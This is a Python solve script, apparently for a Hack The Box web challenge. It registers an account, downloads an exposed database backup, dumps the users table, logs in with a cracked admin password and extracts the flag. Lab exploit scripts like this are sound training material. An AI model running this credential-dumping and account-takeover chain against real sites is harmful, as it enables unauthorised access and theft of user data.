import requests
import sqlite3
from bs4 import BeautifulSoup
import urllib.request
import shutil
import re

host, port = "94.237.55.96", 44616

url = f"http://{host}:{port}"

session = requests.Session()
login_page = session.get(f"{url}/auth/login")
register_page = session.get(f"{url}/auth/register")


#grab token CSRF
soup = BeautifulSoup(login_page.text, "html.parser")
token = soup.find("input", {"name":"_token"})["value"]
print(token)

data = {
    "_token": token,
    "name": "htb",
    "email": "htb@test.com",
    "password": "password"
}

response = session.post(f"{url}/auth/register",data=data)

login_data = {
    "_token": token,
    "email": "htb@test.com",
    "password": "password"
}

login = session.post(f"{url}/auth/login", data=login_data)

#download backup 
new_url = f"{url}/storage/v1_db_backup_1604123342.tar.gz"
local_filename = "backup.tar.gz"

urllib.request.urlretrieve(new_url,local_filename)

#unpack archive
filename = "backup.tar.gz"
extract = "./"
shutil.unpack_archive(filename,extract,format="gztar")

#connect to sqlite3 and request to database

db_path = "database/database.sqlite"
conn = sqlite3.connect(db_path)
cursor = conn.cursor()
cursor.execute("select * from users;")
rows = cursor.fetchall()

for row in rows:
    print(row)

conn.close()

#e7816e9a10590b1e33b87ec2fa65e6cd -> crackstation -> adminadmin1
print("Creds:nginxatsu-adm-01@makelarid.es: adminadmin1")


#grab a new token for admin login

admin_data = {
    "_token": token,
    "email": "nginxatsu-adm-01@makelarid.es",
    "password": "adminadmin1"
}

admin_login = session.post(f"{url}/auth/login",data=admin_data)

flag = re.search(r"HTB\{.*\}",admin_login.text)
print(flag.group(0))


